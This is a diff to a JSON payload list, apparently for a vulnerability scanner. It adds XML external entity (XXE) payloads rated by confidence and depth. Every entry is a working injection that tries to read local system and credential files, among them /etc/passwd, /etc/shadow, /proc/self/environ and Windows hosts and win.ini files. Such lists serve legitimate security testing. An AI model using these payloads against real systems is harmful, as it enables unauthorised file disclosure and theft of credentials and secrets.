@@ -5,10 +5,16 @@
     "system_entity": [
       {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>\n<root>&xxe;</root>\n", "confidence_hint": 90, "depth": "basic"},
       {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>\n<root>&xxe;</root>\n", "confidence_hint": 85, "depth": "basic"},
-      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\n", "confidence_hint": 90, "depth": "extended"}
+      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\n", "confidence_hint": 90, "depth": "extended"},
+      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://localhost/etc/passwd\">]>\n<root>&xxe;</root>\n", "confidence_hint": 85, "depth": "extended"},
+      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]>\n<root>&xxe;</root>\n", "confidence_hint": 80, "depth": "extended"},
+      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]>\n<root>&xxe;</root>\n", "confidence_hint": 70, "depth": "aggressive"},
+      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>\n<root>&xxe;</root>\n", "confidence_hint": 90, "depth": "aggressive"}
     ],
     "parameter_entity": [
-      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/hostname\"> %xxe;]>\n<root>ok</root>\n", "confidence_hint": 70, "depth": "aggressive"}
+      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/hostname\"> %xxe;]>\n<root>ok</root>\n", "confidence_hint": 70, "depth": "aggressive"},
+      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/os-release\"> %xxe;]>\n<root>ok</root>\n", "confidence_hint": 70, "depth": "basic"},
+      {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>\n<root>ok</root>\n", "confidence_hint": 75, "depth": "aggressive"}
     ]
   }
 }
